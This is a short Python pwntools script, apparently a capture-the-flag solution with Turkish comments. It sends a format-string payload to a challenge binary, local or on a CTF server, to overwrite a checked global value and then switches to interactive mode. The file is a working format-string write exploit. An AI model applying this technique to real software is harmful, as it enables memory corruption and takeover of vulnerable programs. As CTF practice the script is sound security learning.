#!/usr/bin/python
from pwn import *
import sys

context.arch = "amd64"

isim = "./format"

try:
	arg = sys.argv[1]
except:
	arg = "yok"

host,port = "challenges.ctfd.io",30266

# numara 0x404080
if arg == "remote":
	p = remote(host,port)
else:
	p = process(isim)



if arg == "debug":
	pid = gdb.attach(p.pid,"b check_num")

p.read()

# steg 1 caprute the flag
yazmac = {0x404080-7:0x4200000000000000}
payload = fmtstr_payload(6, yazmac, 0)
p.sendline(payload) #  :)
p.read()

p.interactive()
